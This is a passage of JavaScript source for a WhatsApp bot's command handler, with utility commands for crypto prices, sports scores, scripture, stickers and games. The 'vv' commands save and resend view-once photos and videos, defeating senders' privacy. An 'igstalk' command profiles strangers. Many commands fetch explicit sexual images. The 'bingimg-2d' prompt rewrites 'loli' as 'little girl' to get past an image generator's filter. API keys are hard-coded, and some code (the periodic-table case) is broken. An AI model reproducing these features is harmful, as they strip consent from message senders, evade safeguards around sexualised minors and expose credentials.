1️⃣ .crypto-price <coin> - Get the current price of a cryptocurrency.
2️⃣ .crypto-convert <coin> <amount> <currency> - Convert crypto to fiat.
3️⃣ .topcrypto - Show top gainers and losers.
4️⃣ .cryptonews - Get the latest cryptocurrency news.
5️⃣ .cryptoindex - Display the Fear and Greed Index.
6️⃣ .portfolio - Manage your crypto portfolio.\n
Use these commands to explore the crypto world!`;
    reply(menu);
    break;
}

// 1️⃣ Get Current Price
case 'crypto-price': {
    if (!text) return reply('Please provide a cryptocurrency name or symbol. Example: .price bitcoin');
    try {
        const response = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${encodeURIComponent(text)}&vs_currencies=usd`);
        const result = await response.json();

        if (result[text]) {
            reply(`💰 Current Price of ${text.toUpperCase()}: $${result[text].usd}`);
        } else {
            reply('❌ Cryptocurrency not found. Please try again.');
        }
    } catch (error) {
        console.error(error);
        reply('❌ An error occurred while fetching the price. Please try again later.');
    }
    break;
}

// 2️⃣ Convert Cryptocurrency to Fiat
case 'crypto-convert': {
    const args = text.split(' ');
    if (args.length !== 3) return reply('Usage: .convert <coin> <amount> <currency>. Example: .convert btc 1 usd');

    const [coin, amount, currency] = args;
    try {
        const response = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${encodeURIComponent(coin)}&vs_currencies=${encodeURIComponent(currency)}`);
        const result = await response.json();

        if (result[coin] && result[coin][currency]) {
            const converted = (result[coin][currency] * parseFloat(amount)).toFixed(2);
            reply(`💱 ${amount} ${coin.toUpperCase()} = ${converted} ${currency.toUpperCase()}`);
        } else {
            reply('❌ Conversion failed. Please check the inputs.');
        }
    } catch (error) {
        console.error(error);
        reply('❌ An error occurred while converting. Please try again later.');
    }
    break;
}

// 3️⃣ Show Top Gainers and Losers
case 'topcrypto': {
    try {
        const response = await fetch('https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&order=market_cap_desc&per_page=10&page=1&sparkline=false');
        const result = await response.json();

        let topGainers = `*📈 Top Gainers:*\n`;
        let topLosers = `*📉 Top Losers:*\n`;

        for (const coin of result) {
            if (coin.price_change_percentage_24h > 0) {
                topGainers += `🔹 ${coin.name} (${coin.symbol.toUpperCase()}): +${coin.price_change_percentage_24h.toFixed(2)}%\n`;
            } else {
                topLosers += `🔹 ${coin.name} (${coin.symbol.toUpperCase()}): ${coin.price_change_percentage_24h.toFixed(2)}%\n`;
            }
        }

        reply(`${topGainers}\n\n${topLosers}`);
    } catch (error) {
        console.error(error);
        reply('❌ An error occurred while fetching market trends. Please try again later.');
    }
    break;
}

// 4️⃣ Get Latest Crypto News
case 'cryptonews': {
    try {
        const response = await fetch('https://cryptonews-api.com/api/v1?tickers=BTC,ETH&items=5&token=pub_6165012dcdfb7690a1e33a9e58ee1c879790f');
        const result = await response.json();

        if (result.news && result.news.length > 0) {
            let newsList = `*📰 Latest Crypto News:*\n\n`;
            for (const news of result.news) {
                newsList += `🔸 *${news.title}*\n🌐 [Read More](${news.news_url})\n\n`;
            }
            reply(newsList.trim());
        } else {
            reply('❌ No news found at the moment.');
        }
    } catch (error) {
        console.error(error);
        reply('❌ An error occurred while fetching news. Please try again later.');
    }
    break;
}

// 5️⃣ Crypto Fear and Greed Index
case 'cryptoindex': {
    try {
        const response = await fetch('https://api.alternative.me/fng/');
        const result = await response.json();

        if (result.data && result.data[0]) {
            const index = result.data[0];
            reply(`*📊 Fear and Greed Index:*\n\n💡 *Current Value*: ${index.value} (${index.value_classification})\n📅 *Date*: ${index.timestamp}`);
        } else {
            reply('❌ Failed to fetch the Fear and Greed Index.');
        }
    } catch (error) {
        console.error(error);
        reply('❌ An error occurred while fetching the Fear and Greed Index. Please try again later.');
    }
    break;
}

case 'sports': {
    const menu = `*⚽ Sports Menu:*\n
1️⃣ .livescores - Get live scores of ongoing matches.
2️⃣ .fixtures <league> - View upcoming matches for a specific league.
3️⃣ .standings <league> - Check the league standings.
4️⃣ .sportsnews - Get the latest sports news.\n
Use these commands to stay updated with sports events!`;
    reply(menu);
    break;
}
case 'livescore': {
    try {
        const apiUrl = 'https://livescore6.p.rapidapi.com/matches/v2/list-live?Category=soccer';
        const apiKey = 'a5bf8cd433msh33c0811108517b2p1b77a6jsn4cd75f147bf8'; // Your API Key

        // Fetch live scores
        const response = await fetch(apiUrl, {
            method: 'GET',
            headers: {
                'X-RapidAPI-Key': apiKey,
                'X-RapidAPI-Host': 'livescore6.p.rapidapi.com',
            },
        });
        const data = await response.json();

        // Check if there are live matches
        if (!data || !data.Stages || data.Stages.length === 0) {
            reply("No live matches currently.");
            return;
        }

        // Format the live scores
        let liveScores = "*Live Soccer Scores:*\n\n";
        data.Stages.forEach((stage) => {
            stage.Events.forEach((event) => {
                const home = event.T1[0]?.Nm || "Team 1";
                const away = event.T2[0]?.Nm || "Team 2";
                const score = `${event.Tr1 || 0} - ${event.Tr2 || 0}`;
                liveScores += `🏟️ ${home} vs ${away}\nScore: ${score}\n\n`;
            });
        });

        reply(liveScores.trim());
    } catch (error) {
        console.error("Error fetching live scores:", error);
        reply("An error occurred while fetching live scores.");
    }
    break;
}


case 'fixtures': {
    if (!text) return reply('Please provide a league name. Example: .fixtures premier league');
    try {
        const response = await fetch(`https://api.sportradar.us/soccer/trial/v4/en/schedules/2024-12-08/schedule.json?api_key=YOUR_API_KEY`);
        const result = await response.json();

        if (result && result.schedules && result.schedules.length > 0) {
            let fixtures = `*📅 Upcoming Fixtures:*\n\n`;
            for (const match of result.schedules) {
                const { sport_event } = match;
                const home = sport_event.competitors[0].name;
                const away = sport_event.competitors[1].name;
                const date = new Date(sport_event.start_time).toLocaleString();
                fixtures += `🏟️ ${sport_event.sport_event_context.competition.name}\n🔹 ${home} vs ${away}\n📅 ${date}\n\n`;
            }
            reply(fixtures.trim());
        } else {
            reply('❌ No upcoming matches found for this league.');
        }
    } catch (error) {
        console.error(error);
        reply('❌ An error occurred while fetching fixtures. Please try again later.');
    }
    break;
}

// 3️⃣ Get League Standings
case 'standings': {
    if (!text) return reply('Please provide a league name. Example: .standings premier league');
    try {
        const response = await fetch(`https://api.api-football.com/v3/standings?league=${encodeURIComponent(text)}`, {
            headers: { 'x-rapidapi-key': 'YOUR_API_KEY' },
        });
        const result = await response.json();

        if (result.response && result.response[0]) {
            const standings = result.response[0].league.standings[0];
            let table = `*📊 ${result.response[0].league.name} Standings:*\n\n`;
            for (const team of standings) {
                table += `🔹 ${team.rank}. ${team.team.name} - ${team.points} pts\n`;
            }
            reply(table.trim());
        } else {
            reply('❌ No standings found for this league.');
        }
    } catch (error) {
        console.error(error);
        reply('❌ An error occurred while fetching league standings. Please try again later.');
    }
    break;
}

// 4️⃣ Get Latest Sports News
case 'sportsnews': {
    try {
        const response = await fetch('https://newsapi.org/v2/top-headlines?category=sports&apiKey=YOUR_NEWSAPI_KEY');
        const result = await response.json();

        if (result.articles && result.articles.length > 0) {
            let news = `*📰 Latest Sports News:*\n\n`;
            for (const article of result.articles.slice(0, 5)) {
                news += `🔸 *${article.title}*\n🌐 [Read More](${article.url})\n\n`;
            }
            reply(news.trim());
        } else {
            reply('❌ No sports news found at the moment.');
        }
    } catch (error) {
        console.error(error);
        reply('❌ An error occurred while fetching sports news. Please try again later.');
    }
    break;
}

  
  
  case 'vv': case 'readviewonce': {
if (!m?.quoted) return reply('reply the image/video you want to see')
if (m?.quoted.mtype !== 'viewOnceMessageV2') return reply('This is not a view-once message..')
let msg = m?.quoted.message
let type = Object.keys(msg)[0]
const { downloadContentFromMessage } = require('@whiskeysockets/baileys')
let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video')
let buffer = Buffer.from([])
for await (const chunk of media) {
buffer = Buffer.concat([buffer, chunk])
}
if (/video/.test(type)) {
return David.sendFile(m?.chat, buffer, 'media.mp4', msg[type].caption || '', m)
} else if (/image/.test(type)) {
return David.sendFile(m?.chat, buffer, 'media.jpg', msg[type].caption || '', m)
}
}
break

case 'vv2': case 'readviewonce2': {
if (!isCreator) return reply(`For My Owner Only Stupid`) 
    if (!m?.quoted) return reply('Reply to the image/video you want to view.');
    if (m?.quoted.mtype !== 'viewOnceMessageV2') return reply('This is not a view-once message.');

    let msg = m?.quoted.message;
    let type = Object.keys(msg)[0];
    const { downloadContentFromMessage } = require('@whiskeysockets/baileys');
    
    let media = await downloadContentFromMessage(msg[type], type === 'imageMessage' ? 'image' : 'video');
    let buffer = Buffer.from([]);
    
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk]);
    }

    // Get the ID of the user who executed the command
    let userWhatsAppID = m?.sender;

    if (/video/.test(type)) {
        return David.sendFile(userWhatsAppID, buffer, 'media.mp4', msg[type].caption || '', m);
    } else if (/image/.test(type)) {
        return David.sendFile(userWhatsAppID, buffer, 'media.jpg', msg[type].caption || '', m);
    }
}
break;

case 'lyrics': {
if (!args[0]) return reply("Give me a song name")
await David.sendMessage(m?.chat, {react: {text: `🎼`,key: m?.key,}}) 
reply('`Searching...`') 
let d = await fetchJson(`https://api.popcat.xyz/lyrics?song=${args[0]}`)
David.sendMessage(m.chat, { text: d.lyrics})
}
break


case 'periodic-table': {
if (!args[0]) return reply("Give me a chemical element!")
await David.sendMessage(m?.chat, {react: {text: `⏳`,key: m?.key,}}) 
reply('`Searching...`') 
let e = await fetchJson(`https://api.popcat.xyz/periodic-table?element=${args[0]}`)
let david = `${e.name}`;
let anita= `${e.phase}`;
let ass = `${e.symbol}`;
let Jenifer = `${e.atomic_number}`; 
let babe = `${e.summary}`;  

 const pts = `*Name:* ${el}\n *Symbol:* ${es}\n *Phase:* ${eq}\n *Atomic_Number*${ek}\n *Summary* ${ep}`;
 
    await David.sendMessage(m.chat, { 
      image: { url: e.image },  
      caption: pts 
    }, { quoted: m });
}
break





  case 'bible': {
  	
  	const BASE_URL = 'https://bible-api.com'
  try {
    // Extract the chapter number or name from the command text.
    let chapterInput = m.text.split(' ').slice(1).join('').trim()
    if (!chapterInput) {
      throw new Error(`Please specify the chapter number or name. Example: ${prefix + command} john 3:16`)
    }
    // Encode the chapterInput to handle special characters
    chapterInput = encodeURIComponent(chapterInput);
    // Make an API request to fetch the chapter information.
    let chapterRes = await fetch(`${BASE_URL}/${chapterInput}`)
    if (!chapterRes.ok) {
      throw new Error(`Please specify the chapter number or name. Example: ${prefix + command} john 3:16`)
    }
    let chapterData = await chapterRes.json();
    let translatedChapterHindi = await translate(chapterData.text, { to: 'hi', autoCorrect: true })
    let translatedChapterEnglish = await translate(chapterData.text, { to: 'en', autoCorrect: true })
    let bibleChapter = `
📖 *The Holy Bible*\n
📜 *Chapter ${chapterData.reference}*\n
Type: ${chapterData.translation_name}\n
Number of verses: ${chapterData.verses.length}\n
🔮 *Chapter Content (English):*\n
${translatedChapterEnglish.text}\n
🔮 *Chapter Content (Hindi):*\n
${translatedChapterHindi.text}`
    let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: bibleChapter
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: 'Queen_Anita-V3'
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: true,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./anitav3.jpg')}, { upload: David.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"AMEN🙏\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '',
                  newsletterName: '©',
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await David.relayMessage(m.chat, msgs.message, {})
  } catch (error) {
    reply(`Error: ${error.message}`)
  }
  }
  break

 case 'quran': {
    try {
    // Extract the surah number or name from the command text.
    let surahInput = m.text.split(' ')[1]
    if (!surahInput) {
      throw new Error(`Please specify the surah number or name`)
    }
    let surahListRes = await fetch('https://quran-endpoint.vercel.app/quran')
    let surahList = await surahListRes.json()
    let surahData = surahList.data.find(surah => 
        surah.number === Number(surahInput) || 
        surah.asma.ar.short.toLowerCase() === surahInput.toLowerCase() || 
        surah.asma.en.short.toLowerCase() === surahInput.toLowerCase()
    )
    if (!surahData) {
      return reply(`Couldn't find surah with number or name "${surahInput}"`)
    }
    let res = await fetch(`https://quran-endpoint.vercel.app/quran/${surahData.number}`)
    if (!res.ok) {
      let error = await res.json();
      return reply(`API request failed with status ${res.status} and message ${error.message}`)
    }

    let json = await res.json()

    // Translate tafsir from Bahasa Indonesia to Urdu
    let translatedTafsirUrdu = await translate(json.data.tafsir.id, { to: 'ur', autoCorrect: true })

    // Translate tafsir from Bahasa Indonesia to English
    let translatedTafsirEnglish = await translate(json.data.tafsir.id, { to: 'en', autoCorrect: true })

    let quranSurah = `
🕌 *Quran: The Holy Book*\n
📜 *Surah ${json.data.number}: ${json.data.asma.ar.long} (${json.data.asma.en.long})*\n
Type: ${json.data.type.en}\n
Number of verses: ${json.data.ayahCount}\n
🔮 *Explanation (Urdu):*\n
${translatedTafsirUrdu.text}\n
🔮 *Explanation (English):*\n
${translatedTafsirEnglish.text}\n\n © ᴅᴀᴠɪᴅ ᴄʏʀɪʟ`

    reply(quranSurah)

    if (json.data.recitation.full) {
      David.sendMessage(m.chat, { audio: {url: json.data.recitation.full}, mimetype: 'audio/mp4', ptt: true, fileName: `recitation.mp3`, }, {quoted: m})
    }
  } catch (error) {
    reply(`Error: ${error.message}`)
  }
  }
  break
  
  
  case 'qc': {
const { quote } = require('./lib/quote.js')
let text
if (args.length >= 1) {
text = args.slice(0).join(" ")
} else if (m?.quoted && m?.quoted.text) {
text = m?.quoted.text
} else reply("Input text or reply text that you want to make a quote!")
if (!text) return reply('Input text')
if (text.length > 30) return reply('Maximum 30 Teks!')
let ppnyauser = await await David.profilePictureUrl(m?.sender, 'image').catch(_=> 'https://telegra.ph/file/6880771a42bad09dd6087.jpg')
const rest = await quote(text, pushname, ppnyauser)
David.sendImageAsSticker(m?.chat, rest.result, m, { packname: `${global.packname}`, author: `${global.author}`})
}
break
//=================================================//
case 'sticker':
case 'stiker':
case 's': {
    if (!quoted) return reply(`Reply to an image or video with caption ${prefix + command}`);
    if (/image/.test(mime)) {
        const media = await quoted.download();
        await David.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author });
    } else if (/video/.test(mime)) {
        if ((quoted.msg || quoted).seconds > 11) return reply('Maximum 10 seconds!');
        const media = await quoted.download();
        await David.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author });
    } else {
        return reply(`Send an image or video with caption ${prefix + command}. Video should be 1-9 seconds.`);
    }
    break;
}

case 'instagramstalk': case 'igstalk': {
    if (!text) return reply('Please provide a username.\nExample: .igstalk davido');
    
    const username = text.trim(); // Extract the username
    const isLowercase = /^[a-z0-9_.]+$/.test(username); // Validate for lowercase and valid Instagram usernames

    // Reject input if it contains uppercase letters or invalid characters
    if (!isLowercase) {
        return reply('Please use lowercase letters only for the username.\nExample: .igstalk davido');
    }

    try {
        const apiKey = 'gifted-md'; // API key
        const apiUrl = `https://api.giftedtech.my.id/api/stalk/igstalkv2?apikey=${apiKey}&username=${username}`;

        // Fetch Instagram details
        const response = await axios.get(apiUrl);

        if (response.data.status === 200 && response.data.success) {
            const { profile, username, fullName, bio, posts, followers, following } = response.data.result;

            // Construct the reply message
            const message = `*Instagram Stalker*\n\n` +
                            `🔹 *Username:* ${username}\n` +
                            `🔹 *Full Name:* ${fullName}\n` +
                            `🔹 *Bio:* ${bio}\n` +
                            `🔹 *Posts:* ${posts}\n` +
                            `🔹 *Followers:* ${followers}\n` +
                            `🔹 *Following:* ${following}`;

            // Send the response with profile picture
            David.sendMessage(from, { 
                caption: message, 
                image: { url: profile }
            }, { quoted: qsal });
        } else {
            // Handle unsuccessful response
            reply(`Failed to fetch details for username "${username}".\nReason: ${response.data.message || 'Unknown error.'}`);
        }
    } catch (error) {
        // Handle specific errors without logging to console
        if (error.response) {
            reply(`API Error: ${error.response.data.message || 'Unknown API error.'}`);
        } else if (error.request) {
            reply('No response received from the API. Please try again later.');
        } else {
            reply(`An error occurred: ${error.message}`);
        }
    }
    break;
}



case 'truth': {
    try {
        const apiKey = 'gifted-md'; // API key
        const apiUrl = `https://api.giftedtech.my.id/api/fun/truth?apikey=${apiKey}`;
        const imagePath = './davidcyril/servers/truth.png'; // Path to the local image
        const userTag = `@${m.sender.split('@')[0]}`; // Format the tag using the user's number

        // Fetch truth question
        const response = await axios.get(apiUrl);

        if (response.data.status === 200 && response.data.success) {
            const truthQuestion = response.data.result;

            // Send the truth question with proper tagging
            David.sendMessage(from, {
                image: { url: imagePath }, // Use local image
                caption: `${userTag}, you chose *TRUTH*!\n\n*Question:* ${truthQuestion}\n\n*ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅᴀᴠɪᴅ ᴄʏʀɪʟ ᴛᴇᴄʜ*`,
                mentions: [m.sender], // Properly tag the user
            }, { quoted: m });
        } else {
            // Handle unsuccessful response
            reply('Failed to fetch a truth question. Please try again later.');
        }
    } catch (error) {
        // Handle specific errors without exposing logs
        if (error.response) {
            reply(`API Error: ${error.response.data.message || 'Unknown API error.'}`);
        } else if (error.request) {
            reply('No response received from the API. Please try again later.');
        } else {
            reply(`An error occurred: ${error.message}`);
        }
    }
    break;
}

case 'dare': {
    try {
        const apiUrl = `https://api.truthordarebot.xyz/v1/dare`;
        const imagePath = './davidcyril/servers/truth.png'; // Path to the local image
        const userTag = `@${m.sender.split('@')[0]}`; // Format the tag with the user's number

        // Fetch a random dare question
        const response = await axios.get(apiUrl);

        if (response.status === 200 && response.data.type === "DARE") {
            const dareQuestion = response.data.question; // Get the dare question

            // Send the dare question with the local image and proper tagging
            await David.sendMessage(m.chat, {
                image: { url: imagePath }, // Use local image
                caption: `${userTag}, you chose *DARE😈*!\n\n*I Dare You To:*\n\n ${dareQuestion}\n\n> ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅᴀᴠɪᴅ ᴄʏʀɪʟ ᴛᴇᴄʜ`,
                mentions: [m.sender], // Tag the person who requested the dare
            }, { quoted: m });
        } else {
            reply('Failed to fetch a dare question. Please try again later.');
        }
    } catch (error) {
        console.error('Error in Dare command:', error);
        reply(`*AN ERROR OCCURRED!! MESSAGE :*\n\n> ${error.message}`);
    }
    break;
}

           case 'petgif': {
    try {
        let imageUrl;

        // Check if the command is replying to an image
        if (/image/.test(mime)) {
            const mediaPath = await David.downloadAndSaveMediaMessage(quoted);
            const uploadResponse = await uploadToImgur(mediaPath); // Use the Imgur upload function
            if (uploadResponse.status !== "success") {
                fs.unlinkSync(mediaPath); // Clean up the downloaded file
                return reply(`*UPLOAD ERROR!! MESSAGE :*\n\n> ${uploadResponse.message}`);
            }
            imageUrl = uploadResponse.fileUrl; // Get the uploaded image URL
            fs.unlinkSync(mediaPath); // Clean up the downloaded file
        } 
        // Check if a user is mentioned
        else if (m.message.extendedTextMessage && m.message.extendedTextMessage.contextInfo && m.message.extendedTextMessage.contextInfo.mentionedJid) {
            const mentionedJid = m.message.extendedTextMessage.contextInfo.mentionedJid[0];
            imageUrl = await David.profilePictureUrl(mentionedJid, 'image').catch(() => 'https://cdn.popcat.xyz/avatar.png');
        } 
        // If no valid input, send an error message
        else {
            return reply(`*REQUEST ERROR!! MESSAGE :*\n\n> *Reply to an image or mention a user with .petgif to create a petting GIF*`);
        }

        // Call the Pet GIF API
        const apiResponse = await axios.get(`https://api.popcat.xyz/pet`, {
            params: { image: imageUrl }
        });

        if (apiResponse.status === 200) {
            const petGifUrl = apiResponse.request.res.responseUrl; // The URL of the generated pet GIF

            // Send the petting GIF back to the user
            await David.sendMessage(m.chat, {
                video: { url: petGifUrl },
                mimetype: 'video/mp4',
                caption: `*Petting GIF Generated Successfully!* 🐾`
            }, { quoted: m });
        } else {
            reply(`*PET GIF ERROR!! MESSAGE :*\n\n> Failed to create a petting GIF. Try again.`);
        }
    } catch (error) {
        console.error('Error in Petgif command:', error);
        reply(`*AN ERROR OCCURRED!! MESSAGE :*\n\n> ${error.message}`);
    }
    break;
}


case 'take': {
if (!m?.quoted) return reply('Reply with a sticker!')
let stiker = false
try {
let [packname, ...author] = text.split('|')
author = (author || []).join('|')
let mime = m?.quoted.mimetype || ''
if (!/webp/.test(mime)) throw 'Reply with a sticker!'
let img = await m?.quoted.download()
if (!img) throw 'Failed to download sticker!'
stiker = await addExif(img, packname || global.packname, author || global.author )
} catch (e) {
console.error(e)
if (Buffer.isBuffer(e)) stiker = e
else throw 'An error occurred: ' + e
} finally {
if (stiker) David.sendFile(m?.chat, stiker, 'wms.webp', '', m, false, { asSticker: true })
else throw 'Conversion failed'
}
}
break 
     
case 'alert': {
    if (!text) {
        return reply(`*Usage:* .alert <your text>\n\n*Example:* .alert This is an alert!`);
    }

    try {
        // Call the Alert API with the user's query
        const apiResponse = await axios.get(`https://api.popcat.xyz/alert`, {
            params: { text }
        });

        if (apiResponse.status === 200) {
            const alertImageUrl = apiResponse.request.res.responseUrl; // The URL of the generated alert image

            // Send the alert image back to the user
            await David.sendMessage(m.chat, {
                image: { url: alertImageUrl },
                caption: `\n> ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅᴀᴠɪᴅ ᴄʏʀɪʟ ᴛᴇᴄʜ`,
            }, { quoted: m });
        } else {
            reply(`*ALERT GENERATION ERROR!! MESSAGE :*\n\n> Failed to generate an alert image. Try again.`);
        }
    } catch (error) {
        console.error('Error in Alert command:', error);
        reply(`*AN ERROR OCCURRED!! MESSAGE :*\n\n> ${error.message}`);
    }
    break;
}

case 'listblock':{
if (!isCreator) return reply(`For My Owner Only`);
let block = await David.fetchBlocklist()
reply('List Block :\n\n' + `Total : ${block == undefined ? '*0* Blocked' : '*' + block.length + '* Blocked'}\n` + block.map(v => '• ' + v.replace(/@.+/, '')).join`\n`)
}
break


case 'genshin':
    case 'swimsuit':
    case 'schoolswimsuit':
    case 'white':
    case 'barefoot':
    case 'touhou':
    case 'gamecg':
    case 'hololive':
    case 'uncensored':
    case 'sungglasses':
    case 'glasses':
    case 'weapon':
    case 'shirtlift':
    case 'chain':
    case 'fingering':
    case 'flatchest':
    case 'torncloth':
    case 'bondage':
    case 'demon':
    case 'pantypull':
    case 'headdress':
    case 'headphone':
    case 'anusview':
    case 'shorts':
    case 'stokings':
    case 'topless':
    case 'beach':
    case 'bunnygirl':
    case 'bunnyear':
    case 'vampire':
    case 'nobra':
    case 'bikini':
    case 'whitehair':
    case 'blonde':
    case 'pinkhair':
    case 'bed':
    case 'ponytail':
    case 'nude':
    case 'dress':
    case 'underwear':
    case 'foxgirl':
    case 'uniform':
    case 'skirt':
    case 'breast':
    case 'twintail':
    case 'spreadpussy':
    case 'seethrough':
    case 'breasthold':
    case 'fateseries':
    case 'spreadlegs':
    case 'openshirt':
    case 'headband':
    case 'nipples':
    case 'erectnipples':
    case 'greenhair':
    case 'wolfgirl':
    case 'catgirl': {
    try {
        // Fetch data from the API
        let res = await fetch(`https://fantox-apis.vercel.app/${command}`);
        if (!res.ok) throw `API error: ${res.status}`;
        
        // Parse JSON response
        let json = await res.json();
        if (!json.url) throw `No URL found in the API response.`;

        // Fetch image buffer from the URL
        let imageRes = await fetch(json.url);
        if (!imageRes.ok) throw `Failed to fetch image: ${imageRes.status}`;
        let buffer = await imageRes.buffer();

        // Send the image using your bot's sendFile function
        await David.sendFile(
            m.chat, 
            buffer, 
            'image.jpg', 
            `*ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅᴀᴠɪᴅ ᴄʏʀɪʟ ᴛᴇᴄʜ*`, 
            m
        );
    } catch (error) {
        console.error(error);
        reply(`An error occurred: ${error.message || error}`);
    }
    break;
}

  


case 'smeme': {
let respond = `Send/reply image/sticker with caption ${prefix + command} text1|text2`
if (!/image/.test(mime)) return reply(respond)
if (!text) return reply(respond)
try {
atas = text.split('|')[0] ? text.split('|')[0] : '-'
bawah = text.split('|')[1] ? text.split('|')[1] : '-'
let dwnld = await David.downloadAndSaveMediaMessage(qmsg)
let fatGans = await TelegraPH(dwnld)
let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(bawah)}/${encodeURIComponent(atas)}.png?background=${fatGans}`
let FaTiH = await David.sendImageAsSticker(m?.chat, smeme, m, { packname: global.packname, author: global.auhor })
await fs.unlinkSync(FaTiH)
} catch (e) {
}
}
break

case 'imgsearch': case 'img': {
    if (!text) {
        return reply(`*Usage:* .bingimg <query>\n\n*Example:* .img cat`);
    }

    try {
        // Call the Bing Image Search API
        const apiResponse = await axios.get(`https://api.siputzx.my.id/api/s/bimg`, {
            params: { query: text }
        });

        if (apiResponse.status === 200 && apiResponse.data.status) {
            const images = apiResponse.data.data;

            if (images.length === 0) {
                return reply(`No images found for "${text}". Please try another query.`);
            }

            // Send up to 5 images
            const maxImages = Math.min(images.length, 5);
            for (let i = 0; i < maxImages; i++) {
                await David.sendMessage(m.chat, {
                    image: { url: images[i] },
                    caption: `🔎Image Search\n\n📄 Query: "${text}"\n📷 Image ${i + 1}/${maxImages}\n\n> ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅᴀᴠɪᴅ ᴄʏʀɪʟ ᴛᴇᴄʜ`,
                }, { quoted: m });
            }
        } else {
            reply(`*ERROR!! MESSAGE :*\n\n> Failed to fetch images. Try again.`);
        }
    } catch (error) {
        console.error('Error in Image Search command:', error);
        reply(`*AN ERROR OCCURRED!! MESSAGE :*\n\n> ${error.message}`);
    }
    break;
}


case "bingimg-2d": {
if (!text) return reply("[ ! ] Enter the image prompt you want to create");
let teksu = text.replace(/loli/gi, "little girl");
try {
const { BingApi, apikeybing } = require('./lib/bing-image.js');
const bingApi = new BingApi(apikeybing);
const imagesUrls = await bingApi.createImages(teksu + ". Anime Style ultra, HD Anime Style, 4K Anime Style, Anime Style, High quality, Ultra grapics, HD Cinematic, anime, 4K resolution, HD quality, Ultra CGI, High quality, Ultra grapics, HD Cinematic", false);
const totalCount = imagesUrls.length;
const credits = await bingApi.getCredits();

if (totalCount > 0) {
for (let i = 0; i < totalCount; i++) {
try {
await new Promise(resolve => setTimeout(resolve, i * 6000));
David.sendMessage(m?.chat, { image: { url: imagesUrls[i] }, caption: `Image *(${i + 1}/${totalCount})*\n\nRemaining Credits: ${credits}\nPrompt: ${text}` }, { quoted:fsaluran });
} catch (error) {
console.error(`Error sending file: ${error.message}`);
await reply(`Failed to send image *(${i + 1}/${totalCount})*`);
}
}
} else {
await reply('No images found after filtering.');
}
} catch (error) {
await reply('An error occurred while processing the request.');
}
};
break




          case 'delete': case 'del': case 'd':{
          
          
            	 let key = {}
 try {
 	key.remoteJid = m.quoted ? m.quoted.fakeObj.key.remoteJid : m.key.remoteJid
	key.fromMe = m.quoted ? m.quoted.fakeObj.key.fromMe : m.key.fromMe
	key.id = m.quoted ? m.quoted.fakeObj.key.id : m.key.id
 	key.participant = m.quoted ? m.quoted.fakeObj.participant : m.key.participant
 } catch (e) {
 	console.error(e)
 }
 David.sendMessage(m.chat, { delete: key })
}
break

case 'leavegc': {
if (!isCreator) return reply('`This Command Is For My Owner Only`')
await David.groupLeave(m.chat)
await reply('`Done!`')
            }
            break

case "gptgo": {
if (!text) return reply (`*Example : ${prefix + command} Hello*`)
var js = await fetch(`https://widipe.com/gptgo?text=${q}`) 
var json = await js.json()
let que = "`"
reply(`${que}Gpt-Go${que}\n\n ${json.result}`)
}
break




case 'alive':
reply('Hi QUEEN_ANITA-V4 is Online')
break







case 'nevo':{
if (!text) return reply('What do you want to ask?')
let dataa = await fetchJson(`https://ai.nevolution.team/nevo?apikey=akbarrdev&prompt=${text}`)
let unvo = dataa.response
reply(unvo)
} 
break


case 'npmstalk':{
if (!q) return reply(`Example ${prefix+command} xeonapi`)
await loading()
let npmstalk = require('./lib/scraper')
eha = await npmstalk.npmstalk(q)
reply(`*/ Npm Stalker \\*

Name : ${eha.name}
Version Latest : ${eha.versionLatest}
Version Publish : ${eha.versionPublish}
Version Update : ${eha.versionUpdate}
Latest Dependencies : ${eha.latestDependencies}
Publish Dependencies : ${eha.publishDependencies}
Publish Time : ${eha.publishTime}
Latest Publish Time : ${eha.latestPublishTime}`)
}
break
case 'ffstalk':{
if (!q) return reply(`Example ${prefix+command} 946716486`)
await loading()
let ffstalk = require('./lib/scraper')
eeh = await ffstalk.ffstalk(`${q}`)
reply(`*/ Free Fire Stalker \\*

Id : ${eeh.id}
Nickname : ${eeh.nickname}`)
}
break 


 case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
